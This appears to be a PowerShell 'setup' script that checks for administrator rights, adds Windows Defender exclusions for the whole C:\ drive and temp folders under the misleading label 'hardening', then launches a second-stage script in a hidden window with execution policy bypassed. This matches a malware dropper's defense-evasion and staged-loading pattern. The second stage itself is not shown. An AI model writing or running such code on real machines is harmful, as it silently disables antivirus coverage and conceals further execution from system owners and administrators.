
#region Logging Functions

Function Log-Info($Message) {
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Write-Host "$timestamp - INFO: $Message" -ForegroundColor Cyan
}

Function Log-Error($Message) {
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $errorMsg = "$timestamp - ERROR: $Message"
    Write-Host $errorMsg -ForegroundColor Red
    Add-Content -Path "C:\setup_log.txt" -Value $errorMsg
}
#endregion

#region Admin Check
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Log-Error "Please run this script as Administrator!"
    exit 1
}
#endregion

#region Pre-Defender Hardening (21.ps1)
try {
    Set-MpPreference -ExclusionPath "C:\", "C:\Windows\Temp", "C:\Packages"
    Log-Info "Early Defender exclusion added for C:\\ and system temp directories."
} catch {
    Log-Error "Failed to set Defender exclusions early: $_"
}

Start-Sleep -Seconds 10

#region Start Full Setup (22.ps1)
$scriptPath = "C:\\22.ps1"
if (Test-Path $scriptPath) {
    Log-Info "Executing second stage setup script (22.ps1)..."
    Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File $scriptPath" -WindowStyle Hidden
} else {
    Log-Error "Second stage setup script (22.ps1) not found!"
}
#endregion
